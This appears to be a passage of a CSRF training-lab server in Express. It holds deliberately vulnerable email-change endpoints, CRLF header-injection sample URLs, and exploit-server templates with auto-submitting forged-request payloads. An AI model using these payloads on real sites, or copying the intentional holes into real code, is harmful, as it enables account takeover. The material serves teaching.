        setTimeout(() => el.classList.remove('changed'), 1200);
    }
    // Solved banner
    if (data.solved) {
        document.getElementById('solved-banner').style.display = 'block';
        document.getElementById('badge-solved').style.display  = 'inline-block';
        document.getElementById('badge-unsolved').style.display = 'none';
    }
    // Request inspector
    if (data.lastRequest) {
        const lr = data.lastRequest;
        document.getElementById('req-inspector').innerHTML =
            '<div style="background:#1e1e2e;color:#cdd6f4;border-radius:6px;overflow:hidden;font-family:monospace;font-size:12px;">'
          + '<div style="background:#181825;padding:8px 14px;color:#cba6f7;font-weight:bold;display:flex;align-items:center;gap:10px;">'
          + 'Last Received Request'
          + '<span style="background:' + (lr.success?'#a6e3a1':'#f38ba8') + ';color:#1e1e2e;padding:2px 8px;border-radius:3px;font-size:11px;">'
          + (lr.success ? '200 OK' : '403 FORBIDDEN') + '</span>'
          + (lr.fromExploit ? '<span style="background:#fab387;color:#1e1e2e;padding:2px 8px;border-radius:3px;font-size:11px;">⚠️ CSRF DETECTED</span>' : '')
          + '</div>'
          + '<div style="padding:14px;line-height:2;">'
          + '<div><span style="color:#89b4fa">Method:</span>      ' + lr.method + '</div>'
          + '<div><span style="color:#89b4fa">Referer:</span>     ' + (lr.referer || '<em style="color:#6c7086">not sent</em>') + '</div>'
          + '<div><span style="color:#89b4fa">CSRF Token:</span>  ' + (lr.csrfToken || '<em style="color:#6c7086">not present</em>') + '</div>'
          + '<div><span style="color:#89b4fa">Email param:</span> ' + lr.email + '</div>'
          + '<div><span style="color:#89b4fa">Result:</span>      <span style="color:' + (lr.fromExploit?'#a6e3a1':'#fab387') + '">' + lr.message + '</span></div>'
          + '</div></div>';
    }
}

// Apply immediately for already-solved state
// show solved state immediately if page loads in already-solved state
if (${state.solved}) {
    document.getElementById('solved-banner').style.display = 'block';
    document.getElementById('badge-solved').style.display  = 'inline-block';
    document.getElementById('badge-unsolved').style.display = 'none';
    document.getElementById('email-display').textContent = ${JSON.stringify(state.email)};
}
// poll every 2 seconds for live updates
setInterval(async () => {
    try {
        const d = await (await fetch('/api/lab/1')).json();
        document.getElementById('email-display').textContent = d.email;
        if (d.solved) {
            document.getElementById('solved-banner').style.display = 'block';
            document.getElementById('badge-solved').style.display  = 'inline-block';
            document.getElementById('badge-unsolved').style.display = 'none';
        }
        if (d.lastRequest) {
            const lr = d.lastRequest;
            document.getElementById('req-inspector').innerHTML =
                '<div style="background:#1e1e2e;color:#cdd6f4;border-radius:6px;overflow:hidden;font-family:monospace;font-size:12px;">'
              + '<div style="background:#181825;padding:8px 14px;color:#cba6f7;font-weight:bold;display:flex;gap:10px;align-items:center;">'
              + 'Last Request'
              + '<span style="background:' + (lr.success ? '#a6e3a1' : '#f38ba8') + ';color:#1e1e2e;padding:2px 8px;border-radius:3px;font-size:11px;">' + (lr.success ? '200 OK' : '403') + '</span>'
              + (lr.fromExploit ? '<span style="background:#fab387;color:#1e1e2e;padding:2px 8px;border-radius:3px;font-size:11px;">⚠️ CSRF DETECTED</span>' : '')
              + '</div><div style="padding:14px;line-height:2;">'
              + '<div><span style="color:#89b4fa">Method:</span> ' + lr.method + '</div>'
              + '<div><span style="color:#89b4fa">Referer:</span> ' + (lr.referer || '<em style="color:#6c7086">not sent</em>') + '</div>'
              + '<div><span style="color:#89b4fa">CSRF Token:</span> ' + (lr.csrfToken || '<em style="color:#6c7086">not present</em>') + '</div>'
              + '<div><span style="color:#89b4fa">Email:</span> ' + lr.email + '</div>'
              + '<div><span style="color:#89b4fa">Result:</span> <span style="color:' + (lr.fromExploit ? '#a6e3a1' : '#fab387') + '">' + lr.message + '</span></div>'
              + '</div></div>';
        }
    } catch(e) {}
}, 2000);

// Sync email input → PoC textarea in real-time
(function() {
    const emailInput = document.getElementById('lab-email-input');
    if (!emailInput) return;
    emailInput.addEventListener('input', syncEmailToPoC);
    emailInput.addEventListener('change', syncEmailToPoC);
    function syncEmailToPoC() {
        const ta = document.getElementById('poc-code');
        if (!ta) return;
        const email = emailInput.value.trim() || 'attacker@evil.com';
        // store original once
        if (!ta.dataset.orig) ta.dataset.orig = ta.value;
        ta.value = ta.dataset.orig.replace(/value="attacker@evil\.com"/g, 'value="' + email + '"');
    }
})();
</script>
</body>
</html>`);
});

app.post('/email/change/1', (req, res) => {
    const email = req.body.email || '';
    const referer = req.headers.referer || '';
    // CSRF detected when request comes from the exploit server, not from the lab page itself
    const fromExploit = referer.includes('/exploit');
    if (fromExploit && email) labState[1].solved = true;
    labState[1].email = email || labState[1].email;
    labState[1].lastRequest = {
        method: 'POST',
        referer: referer || null,
        csrfToken: req.body.csrf || null,
        email,
        fromExploit,
        success: true,
        message: fromExploit
            ? `CSRF attack! Email changed to ${email}`
            : `Email changed to ${email} (legitimate user action)`
    };
    res.redirect('/my-account');
});

// ─── Lab 1 — Vulnerable Website (My Account page) ───────────────────────────

app.get('/my-account', (req, res) => {
    const state = labState[1];
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>My Account - Security Forum</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',sans-serif;background:#f4f7f9;color:#333}
.site-header{background:#1a252f;padding:0 30px;display:flex;align-items:center;justify-content:space-between;height:50px;border-bottom:3px solid #ff6600}
.site-header .brand{color:white;font-weight:bold;font-size:17px;text-decoration:none}
.site-nav a{color:#ccc;text-decoration:none;margin-left:20px;font-size:14px;padding:5px 0}
.site-nav a:hover,.site-nav a.active{color:#ff6600}
.wrapper{max-width:900px;margin:40px auto;padding:0 20px}
.card{background:white;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.08);overflow:hidden}
.card-title{background:#f8f9fa;border-bottom:1px solid #dee2e6;padding:16px 24px;font-size:18px;font-weight:bold;color:#232f3e}
.card-body{padding:28px 24px}
.field{display:flex;align-items:center;margin-bottom:18px;gap:0}
.field label{width:110px;font-size:13px;font-weight:bold;color:#6c757d;text-transform:uppercase;letter-spacing:.5px}
.field .val{font-size:15px;color:#232f3e;font-family:monospace;background:#f8f9fa;padding:6px 12px;border-radius:4px;border:1px solid #dee2e6}
.field .val.changed{background:#fff3cd;border-color:#ffc107;transition:background .4s}
hr{border:none;border-top:1px solid #eee;margin:22px 0}
.update-section h3{font-size:14px;color:#6c757d;margin-bottom:14px;text-transform:uppercase;letter-spacing:.5px}
.update-form{display:flex;gap:10px;align-items:center}
.update-form input[type=email]{padding:10px 14px;border:1px solid #ced4da;border-radius:5px;font-size:14px;width:300px;outline:none}
.update-form input[type=email]:focus{border-color:#ff6600;box-shadow:0 0 0 3px rgba(255,102,0,.15)}
.update-form button{padding:10px 22px;background:#ff6600;color:white;border:none;border-radius:5px;font-weight:bold;font-size:14px;cursor:pointer}
.update-form button:hover{background:#e55c00}
.vuln-note{margin-top:10px;font-size:11px;color:#dc3545;display:flex;align-items:center;gap:5px}
.back-link{display:inline-block;margin-top:20px;color:#666;font-size:13px;text-decoration:none}
.back-link:hover{color:#ff6600}
</style>
</head>
<body>

<div class="site-header">
    <a href="#" class="brand">Security Forum</a>
    <nav class="site-nav">
        <a href="#">Home</a>
        <a href="/my-account" class="active">My Account</a>
    </nav>
</div>

<div class="wrapper">
    <div class="card">
        <div class="card-title">My Account</div>
        <div class="card-body">

            <div class="field">
                <label>Username</label>
                <span class="val">wiener</span>
            </div>
            <div class="field">
                <label>Email</label>
                <span class="val" id="email-val">${state.email}</span>
            </div>

            <hr>

            <div class="update-section">
                <h3>Update Email</h3>
                <form action="/email/change/1" method="POST" class="update-form">
                    <input type="email" name="email" id="lab-email-input" placeholder="Enter new email address" required>
                    <button type="submit">Update email</button>
                </form>
                <p class="vuln-note">⚠️ <strong>Vulnerability:</strong> This form has no CSRF token — any website can forge this request.</p>
            </div>

        </div>
    </div>
    <a href="/lab/no-defenses" class="back-link">← Back to Lab</a>
</div>

<script>
// Poll for live email updates (e.g. after CSRF exploit fires)
setInterval(async () => {
    try {
        const r = await fetch('/api/lab/1');
        const d = await r.json();
        const el = document.getElementById('email-val');
        if (el && el.textContent !== d.email) {
            el.textContent = d.email;
            el.classList.add('changed');
        }
    } catch(e){}
}, 1500);
</script>
</body>
</html>`);
});

// ─── Lab 2: Token validated on POST only ────────────────────────────────────

app.get('/lab/token-method', (req, res) => {
    // GET: no token check — directly change email if param present
    if (req.query.email) {
        labState[2].email = req.query.email;
        labState[2].lastRequest = {
            method: 'GET',
            referer: req.headers.referer || null,
            csrfToken: null,
            email: req.query.email,
            success: true,
            message: `GET bypass — email changed to ${req.query.email}`
        };
    }
    const form = `
        <form action="/email/change/2" method="POST">
            <input type="hidden" name="csrf" value="${VICTIM_CSRF_TOKEN}">
            <label>New email address:</label><br>
            <input type="email" name="email" id="lab-email-input" placeholder="new@example.com" style="width:calc(100% - 24px);padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin:8px 0 12px;">
            <br><button class="btn" type="submit">Update email</button>
        </form>
        <p style="font-size:12px;color:#888;margin-top:8px;">CSRF token is validated for POST — but what about GET?</p>
    `;
    res.send(renderLabPage(1, 2, req, res, form));
});

// GET-based change (endpoint also reachable directly for the bypass)
app.get('/email/change/2', (req, res) => {
    const email = req.query.email || '';
    if (email) {
        if (email) labState[2].solved = true;
        labState[2].email = email;
        labState[2].lastRequest = {
            method: 'GET',
            referer: req.headers.referer || null,
            csrfToken: null,
            email,
            success: true,
            message: `GET bypass — email changed to ${email}`
        };
    }
    res.redirect('/lab/token-method');
});

app.post('/email/change/2', (req, res) => {
    const token = req.body.csrf;
    const email = req.body.email || '';
    if (!token || token !== VICTIM_CSRF_TOKEN) {
        labState[2].lastRequest = {
            method: 'POST',
            referer: req.headers.referer || null,
            csrfToken: token || null,
            email,
            success: false,
            message: 'POST blocked — invalid or missing CSRF token'
        };
        return res.status(403).redirect('/lab/token-method');
    }
    labState[2].email = email;
    labState[2].lastRequest = {
        method: 'POST',
        referer: req.headers.referer || null,
        csrfToken: token,
        email,
        success: true,
        message: `Email changed to ${email}`
    };
    res.redirect('/lab/token-method');
});

// ─── Lab 3: Token validated only when present ───────────────────────────────

app.get('/lab/token-present', (req, res) => {
    const form = `
        <form action="/email/change/3" method="POST">
            <input type="hidden" name="csrf" value="${VICTIM_CSRF_TOKEN}">
            <label>New email address:</label><br>
            <input type="email" name="email" id="lab-email-input" placeholder="new@example.com" style="width:calc(100% - 24px);padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin:8px 0 12px;">
            <br><button class="btn" type="submit">Update email</button>
        </form>
        <p style="font-size:12px;color:#888;margin-top:8px;">Token is checked — but only when the field is present in the request.</p>
    `;
    res.send(renderLabPage(2, 3, req, res, form));
});

app.post('/email/change/3', (req, res) => {
    const email = req.body.email || '';
    // Vulnerable: only validates if csrf param exists
    if (req.body.csrf !== undefined) {
        if (req.body.csrf !== VICTIM_CSRF_TOKEN) {
            labState[3].lastRequest = {
                method: 'POST',
                referer: req.headers.referer || null,
                csrfToken: req.body.csrf,
                email,
                success: false,
                message: 'Blocked — token present but invalid'
            };
            return res.status(403).redirect('/lab/token-present');
        }
    }
    // Token absent — no check performed (this IS the bypass)
    if (email && req.body.csrf === undefined) labState[3].solved = true;
    labState[3].email = email;
    labState[3].lastRequest = {
        method: 'POST',
        referer: req.headers.referer || null,
        csrfToken: req.body.csrf || null,
        email,
        success: true,
        message: req.body.csrf ? `Email changed to ${email}` : `Token absent — check skipped, email changed to ${email}`
    };
    res.redirect('/lab/token-present');
});

// ─── Lab 4: Token not tied to session ───────────────────────────────────────

app.get('/lab/token-session', (req, res) => {
    const form = `
        <form action="/email/change/4" method="POST">
            <input type="hidden" name="csrf" value="${VICTIM_CSRF_TOKEN}">
            <label>New email address:</label><br>
            <input type="email" name="email" id="lab-email-input" placeholder="new@example.com" style="width:calc(100% - 24px);padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin:8px 0 12px;">
            <br><button class="btn" type="submit">Update email</button>
        </form>
        <p style="font-size:12px;color:#888;margin-top:8px;">Token checked against global pool — any valid token works for any user.</p>
    `;
    res.send(renderLabPage(3, 4, req, res, form));
});

app.post('/email/change/4', (req, res) => {
    const token = req.body.csrf;
    const email = req.body.email || '';
    // Vulnerable: checks pool, not session binding
    if (!token || !globalTokenPool.has(token)) {
        labState[4].lastRequest = {
            method: 'POST',
            referer: req.headers.referer || null,
            csrfToken: token || null,
            email,
            success: false,
            message: 'Token not in global pool — blocked'
        };
        return res.status(403).redirect('/lab/token-session');
    }
    if (email) labState[4].solved = true;
    labState[4].email = email;
    labState[4].lastRequest = {
        method: 'POST',
        referer: req.headers.referer || null,
        csrfToken: token,
        email,
        success: true,
        message: `Token in pool (not session-tied) — email changed to ${email}`
    };
    res.redirect('/lab/token-session');
});

// ─── Lab 5: SameSite Lax bypass via GET ─────────────────────────────────────

app.get('/lab/samesite-lax', (req, res) => {
    // SameSite=Lax cookie set in response
    res.setHeader('Set-Cookie', `session=${VICTIM_SESSION}; SameSite=Lax; Path=/`);
    // GET-based change if email param present
    if (req.query.email) {
        labState[5].email = req.query.email;
        labState[5].lastRequest = {
            method: 'GET',
            referer: req.headers.referer || null,
            csrfToken: null,
            email: req.query.email,
            success: true,
            message: `SameSite=Lax bypassed via GET — email changed to ${req.query.email}`
        };
    }
    const form = `
        <form action="/email/change/5" method="POST">
            <label>New email address:</label><br>
            <input type="email" name="email" id="lab-email-input" placeholder="new@example.com" style="width:calc(100% - 24px);padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin:8px 0 12px;">
            <br><button class="btn" type="submit">Update email</button>
        </form>
        <p style="font-size:12px;color:#888;margin-top:8px;">SameSite=Lax is set. Cross-site POST is blocked — but GET is accepted too!</p>
    `;
    res.send(renderLabPage(4, 5, req, res, form));
});

// GET-based change (the bypass target)
app.get('/email/change/5', (req, res) => {
    const email = req.query.email || '';
    if (email) {
        labState[5].solved = true;
        labState[5].email = email;
        labState[5].lastRequest = {
            method: 'GET',
            referer: req.headers.referer || null,
            csrfToken: null,
            email,
            success: true,
            message: `SameSite=Lax bypassed via GET — email changed to ${email}`
        };
    }
    res.redirect('/lab/samesite-lax');
});

app.post('/email/change/5', (req, res) => {
    // Simulates SameSite=Lax: cross-site POST would not include cookie in real browser.
    // Here we just record it as blocked to illustrate the concept.
    labState[5].lastRequest = {
        method: 'POST',
        referer: req.headers.referer || null,
        csrfToken: null,
        email: req.body.email || '',
        success: false,
        message: 'Cross-site POST blocked by SameSite=Lax (in real browser, cookie would not be sent)'
    };
    res.redirect('/lab/samesite-lax');
});

// ─── Lab 6: Referer bypass ───────────────────────────────────────────────────

app.get('/lab/referer-bypass', (req, res) => {
    const form = `
        <form action="/email/change/6" method="POST">
            <label>New email address:</label><br>
            <input type="email" name="email" id="lab-email-input" placeholder="new@example.com" style="width:calc(100% - 24px);padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin:8px 0 12px;">
            <br><button class="btn" type="submit">Update email</button>
        </form>
        <p style="font-size:12px;color:#888;margin-top:8px;">Referer is validated — but only when the header is present.</p>
    `;
    res.send(renderLabPage(5, 6, req, res, form));
});

app.post('/email/change/6', (req, res) => {
    const referer = req.headers.referer || null;
    const email = req.body.email || '';
    // Vulnerable: skips check when referer is absent
    if (referer && !referer.includes('localhost:3000')) {
        labState[6].lastRequest = {
            method: 'POST',
            referer,
            csrfToken: null,
            email,
            success: false,
            message: `Blocked — Referer (${referer}) is not from this site`
        };
        return res.status(403).redirect('/lab/referer-bypass');
    }
    if (email && !referer) labState[6].solved = true;  // bypass = no Referer header
    labState[6].email = email;
    labState[6].lastRequest = {
        method: 'POST',
        referer,
        csrfToken: null,
        email,
        success: true,
        message: referer ? `Email changed to ${email}` : `Referer absent — check skipped, email changed to ${email}`
    };
    res.redirect('/lab/referer-bypass');
});

// ─── Lab 7: SameSite Lax bypass via method override ─────────────────────────

app.get('/lab/method-override', (req, res) => {
    // Set victim's session cookie without SameSite (defaults to Lax)
    res.setHeader('Set-Cookie', `session=${VICTIM_SESSION}; Path=/`);
    const form = `
        <form action="/email/change/7" method="POST">
            <label>New email address:</label><br>
            <input type="email" name="email" id="lab-email-input" placeholder="new@example.com" style="width:calc(100% - 24px);padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin:8px 0 12px;">
            <br><button class="btn" type="submit">Update email</button>
        </form>
        <p style="font-size:12px;color:#888;margin-top:8px;">SameSite Lax default blocks cross-site POST. But what if method overriding is supported?</p>
    `;
    res.send(renderLabPage(labs.findIndex(l=>l.id===7), 7, req, res, form));
});

app.get('/email/change/7', (req, res) => {
    const email = req.query.email || '';
    const methodOverride = req.query._method || '';
    const session = req.cookies && req.cookies.session ? req.cookies.session : null;

    // Check for session cookie first (in real browser it would be sent on GET navigation)
    if (session !== VICTIM_SESSION) {
        labState[7].lastRequest = {
            method: 'GET', referer: req.headers.referer || null,
            csrfToken: null, email, success: false,
            message: 'GET blocked — missing session cookie (unauthorized)'
        };
        return res.status(401).send('<p style="font-family:sans-serif;padding:20px;color:red;">Unauthorized session</p>');
    }

    if (methodOverride.toUpperCase() === 'POST') {
        if (email) {
            labState[7].solved = true;
            labState[7].email = email;
            labState[7].lastRequest = {
                method: 'GET',
                referer: req.headers.referer || null,
                csrfToken: null,
                email,
                success: true,
                message: `Method override GET bypass (_method=POST) — email changed to ${email}`
            };
        }
        res.redirect('/lab/method-override');
    } else {
        labState[7].lastRequest = {
            method: 'GET',
            referer: req.headers.referer || null,
            csrfToken: null,
            email,
            success: false,
            message: 'GET /email/change/7 blocked — Method POST required (use _method=POST to override)'
        };
        res.status(405).send('<p style="font-family:sans-serif;padding:20px;color:red;">405 Method Not Allowed: Use POST requests for state modifications.</p>');
    }
});

app.post('/email/change/7', (req, res) => {
    const email = req.body.email || '';
    const session = req.cookies && req.cookies.session ? req.cookies.session : null;

    if (session !== VICTIM_SESSION) {
        labState[7].lastRequest = {
            method: 'POST', referer: req.headers.referer || null,
            csrfToken: null, email, success: false,
            message: 'POST blocked — missing session cookie'
        };
        return res.status(403).redirect('/lab/method-override');
    }

    labState[7].email = email;
    labState[7].lastRequest = {
        method: 'POST',
        referer: req.headers.referer || null,
        csrfToken: null,
        email,
        success: true,
        message: `Email changed to ${email} (Legitimate POST)`
    };
    res.redirect('/lab/method-override');
});

// ─── Lab 8: Token tied to non-session cookie ─────────────────────────────────

app.get('/lab/csrf-cookie', (req, res) => {
    // Set victim's csrfKey cookie (simulates the target app setting it)
    res.setHeader('Set-Cookie', `csrfKey=${VICTIM_CSRF_KEY}; Path=/; SameSite=Lax`);
    const form = `
        <form action="/email/change/8" method="POST">
            <input type="hidden" name="csrf" value="${VICTIM_CSRF_TOKEN8}">
            <label>New email address:</label><br>
            <input type="email" name="email" id="lab-email-input" placeholder="new@example.com" style="width:calc(100% - 24px);padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin:8px 0 12px;">
            <br><button class="btn" type="submit">Update email</button>
        </form>
        <p style="font-size:12px;color:#888;margin-top:8px;">Token validated against csrfKey cookie — but csrfKey is NOT tied to the session!</p>
        <div style="margin-top:14px;padding:12px;background:#e7f3ff;border-radius:4px;font-size:13px;border-left:4px solid #2196f3;">
            <strong>🔍 Search Endpoint (CRLF Injectable):</strong><br>
            Try: <a href="/lab/csrf-cookie/search?q=test%0d%0aSet-Cookie:%20csrfKey=injected_val%3b%20SameSite=None" target="_blank" style="color:#ff6600;word-break:break-all;">
                /lab/csrf-cookie/search?q=test%0d%0aSet-Cookie:%20csrfKey=injected_val%3b%20SameSite=None
            </a>
        </div>
    `;
    res.send(renderLabPage(labs.findIndex(l=>l.id===8), 8, req, res, form));
});

// CRLF injectable search endpoint for Lab 8
app.get('/lab/csrf-cookie/search', (req, res) => {
    const raw = req.query.q || '';
    const decoded = decodeURIComponent(raw);
    const cookieMatch = decoded.match(/[\r\n]+Set-Cookie:\s*([^\r\n]+)/i);
    if (cookieMatch) {
        try { res.append('Set-Cookie', cookieMatch[1]); } catch(e) {}
    }
    const display = decoded.split(/[\r\n]/)[0].replace(/</g,'&lt;').replace(/>/g,'&gt;');
    res.send(`<p style="font-family:sans-serif;padding:20px;">Search results for: <strong>${display}</strong><br><br><a href="/lab/csrf-cookie">← Back to Lab 8</a></p>`);
});

app.post('/email/change/8', (req, res) => {
    const email  = req.body.email || '';
    const token  = req.body.csrf  || '';
    const csrfKey = req.cookies && req.cookies.csrfKey ? req.cookies.csrfKey : null;
    // Vulnerable: validates token against csrfKey cookie, not session
    const validPairs = {
        [VICTIM_CSRF_KEY]: VICTIM_CSRF_TOKEN8,
        [ATTACKER_CSRF_KEY]: ATTACKER_CSRF_TOKEN8
    };
    const valid = csrfKey && validPairs[csrfKey] === token;
    if (!valid) {
        labState[8].lastRequest = {
            method:'POST', referer: req.headers.referer||null,
            csrfToken: token, email,
            success: false, message: 'Token does not match csrfKey cookie — blocked'
        };
        return res.status(403).redirect('/lab/csrf-cookie');
    }
    const fromExploit = (req.headers.referer||'').includes('/exploit');
    if (fromExploit && email) labState[8].solved = true;
    labState[8].email = email;
    labState[8].lastRequest = {
        method:'POST', referer: req.headers.referer||null,
        csrfToken: token, email, success: true,
        message: csrfKey === ATTACKER_CSRF_KEY
            ? `CSRF bypass! Attacker's csrfKey used — email changed to ${email}`
            : `Email changed to ${email}`
    };
    res.redirect('/lab/csrf-cookie');
});

// ─── Lab 9: Token duplicated in cookie (Double Submit) ───────────────────────

app.get('/lab/csrf-double', (req, res) => {
    // Set csrf cookie = a fixed value (simulates server generating random each time)
    res.setHeader('Set-Cookie', `csrf=${LAB9_CSRF_VALUE}; Path=/; SameSite=Lax`);
    const form = `
        <form action="/email/change/9" method="POST">
            <input type="hidden" name="csrf" value="${LAB9_CSRF_VALUE}">
            <label>New email address:</label><br>
            <input type="email" name="email" id="lab-email-input" placeholder="new@example.com" style="width:calc(100% - 24px);padding:10px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin:8px 0 12px;">
            <br><button class="btn" type="submit">Update email</button>
        </form>
        <p style="font-size:12px;color:#888;margin-top:8px;">Server validates: req.body.csrf === req.cookies.csrf (no server-side state!)</p>
        <div style="margin-top:14px;padding:12px;background:#e7f3ff;border-radius:4px;font-size:13px;border-left:4px solid #2196f3;">
            <strong>🔍 Search Endpoint (CRLF Injectable):</strong><br>
            Try: <a href="/lab/csrf-double/search?q=test%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None" target="_blank" style="color:#ff6600;word-break:break-all;">
                /lab/csrf-double/search?q=test%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None
            </a>
        </div>
    `;
    res.send(renderLabPage(labs.findIndex(l=>l.id===9), 9, req, res, form));
});

// CRLF injectable search endpoint for Lab 9
app.get('/lab/csrf-double/search', (req, res) => {
    const raw = req.query.q || '';
    const decoded = decodeURIComponent(raw);
    const cookieMatch = decoded.match(/[\r\n]+Set-Cookie:\s*([^\r\n]+)/i);
    if (cookieMatch) {
        try { res.append('Set-Cookie', cookieMatch[1]); } catch(e) {}
    }
    const display = decoded.split(/[\r\n]/)[0].replace(/</g,'&lt;').replace(/>/g,'&gt;');
    res.send(`<p style="font-family:sans-serif;padding:20px;">Search results for: <strong>${display}</strong><br><br><a href="/lab/csrf-double">← Back to Lab 9</a></p>`);
});

app.post('/email/change/9', (req, res) => {
    const email     = req.body.email || '';
    const bodyToken = req.body.csrf  || '';
    const cookieToken = req.cookies && req.cookies.csrf ? req.cookies.csrf : '';
    // Vulnerable: just checks body === cookie, no server-side state
    if (!bodyToken || bodyToken !== cookieToken) {
        labState[9].lastRequest = {
            method:'POST', referer: req.headers.referer||null,
            csrfToken: bodyToken, email, success: false,
            message: `Blocked — body csrf "${bodyToken}" ≠ cookie csrf "${cookieToken}"`
        };
        return res.status(403).redirect('/lab/csrf-double');
    }
    const fromExploit = (req.headers.referer||'').includes('/exploit');
    if (fromExploit && email) labState[9].solved = true;
    labState[9].email = email;
    labState[9].lastRequest = {
        method:'POST', referer: req.headers.referer||null,
        csrfToken: bodyToken, email, success: true,
        message: bodyToken !== LAB9_CSRF_VALUE
            ? `Double-Submit bypass! Injected value "${bodyToken}" matched — email changed to ${email}`
            : `Email changed to ${email}`
    };
    res.redirect('/lab/csrf-double');
});

// ─── Exploit Server ──────────────────────────────────────────────────────────

app.get('/exploit', (req, res) => {
    res.send(savedExploit);
});

app.get('/exploit-editor', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Exploit Server — CSRF Labs</title>
        <style>
            body { font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;margin:0;background:#f0f2f5;color:#333; }
            .header { background:#232f3e;color:#fff;padding:20px;border-bottom:4px solid #ff6600; }
            .header h1 { margin:0;font-size:26px; }
            .container { max-width:1000px;margin:30px auto;background:white;padding:40px;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,0.1); }
            .info-box { background:#e7f3ff;border:1px solid #b8daff;padding:15px;border-radius:4px;margin-bottom:25px;font-size:14px; }
            h2 { color:#ff6600;margin-top:0; }
            label { display:block;font-weight:bold;margin:15px 0 5px;color:#555; }
            textarea { width:100%;height:260px;padding:15px;border:1px solid #ddd;border-radius:4px;font-family:'Consolas',monospace;font-size:13px;box-sizing:border-box; }
            .btn-group { margin-top:25px;display:flex;gap:10px; }
            .btn { padding:12px 24px;border:none;border-radius:4px;cursor:pointer;font-weight:bold;text-decoration:none;display:inline-block;font-size:14px; }
            .btn-orange { background:#ff6600;color:white; }
            .btn-gray { background:#37475a;color:white; }
            .btn-blue { background:#007bff;color:white; }
            .url-display { background:#f8f9fa;padding:10px;border-radius:4px;border:1px solid #ddd;font-family:monospace;margin-bottom:20px; }
            .template-box { background:#f8f9fa;border:1px solid #ddd;border-radius:4px;padding:15px;margin-top:20px; }
            .template-box h3 { margin-top:0;color:#555;font-size:14px; }
            .template-btn { background:#e9ecef;border:1px solid #ccc;border-radius:3px;padding:5px 10px;cursor:pointer;font-size:12px;margin:3px; }
        </style>
    </head>
    <body>
        <div class="header"><h1>Web Security Academy — Exploit Server</h1></div>
        <div class="container">
            <h2>Craft Your CSRF Exploit</h2>
            <div class="info-box">
                <strong>How to use:</strong><br>
                1. Pick a <strong>template</strong> below or write your exploit HTML in the Body.<br>
                2. Click <strong>Store</strong> to save it to the exploit server URL.<br>
                3. Click <strong>Deliver exploit to victim</strong> — the victim's browser opens the exploit URL and the forged request fires.
            </div>

            <div class="url-display">
                <strong>Exploit URL (victim opens this):</strong> http://localhost:3000/exploit
            </div>

            <div class="template-box">
                <h3>Quick Templates:</h3>
                <button class="template-btn" onclick="setTemplate(1)">Lab 1 — Basic POST</button>
                <button class="template-btn" onclick="setTemplate(2)">Lab 2 — GET bypass</button>
                <button class="template-btn" onclick="setTemplate(3)">Lab 3 — Token absent</button>
                <button class="template-btn" onclick="setTemplate(4)">Lab 4 — Attacker token</button>
                <button class="template-btn" onclick="setTemplate(5)">Lab 5 — SameSite Lax</button>
                <button class="template-btn" onclick="setTemplate(6)">Lab 6 — Referer bypass</button>
                <button class="template-btn" onclick="setTemplate(7)">Lab 7 — SameSite Method Override</button>
                <button class="template-btn" onclick="setTemplate(8)">Lab 8 — Token Tied to Cookie</button>
                <button class="template-btn" onclick="setTemplate(9)">Lab 9 — Double Submit Cookie</button>
            </div>

            <form action="/exploit/save" method="POST">
                <label>File:</label>
                <input type="text" value="/exploit" disabled style="width:100%;padding:8px;border:1px solid #ddd;background:#eee;border-radius:4px;box-sizing:border-box;">
                <label>Head:</label>
                <textarea style="height:60px;" disabled>HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8</textarea>
                <label>Body:</label>
                <textarea name="payload" id="payload-text">${savedExploit.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</textarea>
                <div class="btn-group">
                    <button type="submit" class="btn btn-orange">Store</button>
                    <a href="/exploit" target="_blank" class="btn btn-gray">View Exploit</a>
                    <button type="button" class="btn btn-blue" onclick="window.open('/exploit','_blank');alert('Exploit delivered! Victim browser opened http://localhost:3000/exploit');">Deliver exploit to victim</button>
                </div>
            </form>
        </div>
        <script>
        const templates = {
            1: \`<html>\\n  <body>\\n    <form action="http://localhost:3000/email/change/1" method="POST">\\n      <input type="hidden" name="email" value="attacker@evil.com">\\n    </form>\\n    <script>document.forms[0].submit();<\\/script>\\n  </body>\\n</html>\`,
            2: \`<html>\\n  <body>\\n    <script>\\n      document.location = 'http://localhost:3000/email/change/2?email=attacker@evil.com';\\n    <\\/script>\\n  </body>\\n</html>\`,
            3: \`<html>\\n  <body>\\n    <form action="http://localhost:3000/email/change/3" method="POST">\\n      <input type="hidden" name="email" value="attacker@evil.com">\\n      <!-- No csrf field -->\\n    </form>\\n    <script>document.forms[0].submit();<\\/script>\\n  </body>\\n</html>\`,
            4: \`<html>\\n  <body>\\n    <form action="http://localhost:3000/email/change/4" method="POST">\\n      <input type="hidden" name="email" value="attacker@evil.com">\\n      <input type="hidden" name="csrf" value="csrf_token_abc123xyz">\\n    </form>\\n    <script>document.forms[0].submit();<\\/script>\\n  </body>\\n</html>\`,
            5: \`<html>\\n  <body>\\n    <script>\\n      document.location = 'http://localhost:3000/email/change/5?email=attacker@evil.com';\\n    <\\/script>\\n  </body>\\n</html>\`,
            6: \`<html>\\n  <head>\\n    <meta name="referrer" content="never">\\n  </head>\\n  <body>\\n    <form action="http://localhost:3000/email/change/6" method="POST">\\n      <input type="hidden" name="email" value="attacker@evil.com">\\n    </form>\\n    <script>document.forms[0].submit();<\\/script>\\n  </body>\\n</html>\`,
